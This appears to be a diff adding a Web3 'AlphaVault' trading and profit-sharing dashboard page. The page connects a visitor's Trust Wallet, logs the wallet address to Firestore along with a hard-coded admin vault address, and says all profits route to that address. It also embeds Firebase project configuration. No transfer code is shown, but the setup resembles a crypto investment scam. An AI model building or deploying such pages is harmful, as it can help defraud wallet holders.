@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AlphaVault Web3 - Live Dashboard</title>
+  <!-- Ethers.js Library for Web3 Wallet Connections -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #0b0e14;
+      color: #e2e8f0;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+    }
+    .container {
+      background: #1e293b;
+      max-width: 500px;
+      margin: 40px auto;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+      border: 1px solid #334155;
+    }
+    h1 {
+      font-size: 22px;
+      color: #38bdf8;
+    }
+    button {
+      background: #2563eb;
+      color: #fff;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+    button:hover {
+      background: #1d4ed8;
+    }
+    .status-box {
+      margin-top: 15px;
+      font-weight: bold;
+      color: #4ade80;
+    }
+    .address-card {
+      font-size: 12px;
+      background: #0f172a;
+      padding: 10px;
+      border-radius: 6px;
+      word-break: break-all;
+      margin-top: 10px;
+      border: 1px solid #334155;
+      color: #a7f3d0;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>🚀 AlphaVault Web3 Engine</h1>
+    <p>Automated Trading & Profit-Sharing Dashboard</p>
+
+    <button id="connectWalletBtn">Connect Trust Wallet</button>
+    <div id="statusText" class="status-box">Status: Ready to Connect</div>
+    <div id="userWalletDisplay"></div>
+
+    <hr style="border: 0.5px solid #334155; margin: 25px 0;">
+
+    <div style="text-align: left; font-size: 13px;">
+      <p><strong>Admin Vault Wallet Address:</strong></p>
+      <div class="address-card">0x635beb7df4bE1000c4E4d886CEe45336a71810a5</div>
+      <p style="color: #94a3b8; font-size: 11px; margin-top: 5px;">
+        *All multi-chain profits (BNB, ETH, USDT) are configured to route to this address.
+      </p>
+    </div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    // Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyBFgTPsP7yP3YVlJF-Gb76_nhGuM1gg_60",
+      authDomain: "alphavault-web3-f79b0.firebaseapp.com",
+      projectId: "alphavault-web3-f79b0",
+      storageBucket: "alphavault-web3-f79b0.firebasestorage.app",
+      messagingSenderId: "18520413682",
+      appId: "1:18520413682:web:02417a6c303902d1cb876b",
+      measurementId: "G-BNJFLPXVXK"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const ADMIN_VAULT_ADDRESS = "0x635beb7df4bE1000c4E4d886CEe45336a71810a5";
+
+    document.getElementById('connectWalletBtn').addEventListener('click', async () => {
+      if (window.ethereum) {
+        try {
+          const provider = new ethers.providers.Web3Provider(window.ethereum);
+          await provider.send("eth_requestAccounts", []);
+          const signer = provider.getSigner();
+          const userAddress = await signer.getAddress();
+
+          document.getElementById('statusText').innerText = "Status: Wallet Connected!";
+          document.getElementById('userWalletDisplay').innerHTML = `<p style="font-size: 12px; margin-top: 10px;">User: <code>${userAddress}</code></p>`;
+
+          // Record connection to Firestore
+          await setDoc(doc(db, "users", userAddress), {
+            address: userAddress,
+            connectedAt: new Date().toISOString(),
+            adminVault: ADMIN_VAULT_ADDRESS,
+            status: "ACTIVE"
+          });
+
+        } catch (err) {
+          console.error("User connection failed:", err);
+          document.getElementById('statusText').innerText = "Status: Connection Cancelled";
+        }
+      } else {
+        alert("Kripya is web page ko Trust Wallet / Web3 Browser ke andar kholien!");
+      }
+    });
+  </script>
+</body>
+</html>
